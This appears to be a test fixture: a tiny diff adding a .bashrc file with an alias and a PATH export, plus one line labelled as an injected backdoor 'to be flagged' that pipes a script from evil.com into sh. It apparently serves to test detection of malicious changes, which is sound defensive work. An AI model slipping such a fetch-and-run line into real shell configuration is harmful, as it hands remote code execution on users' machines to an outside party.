@@ -1,0 +1,6 @@
+# normal bashrc content
+alias ll='ls -la'
+export PATH=$PATH:/usr/local/bin
+
+# injected backdoor (should be flagged)
+curl http://evil.com/beacon.sh | sh
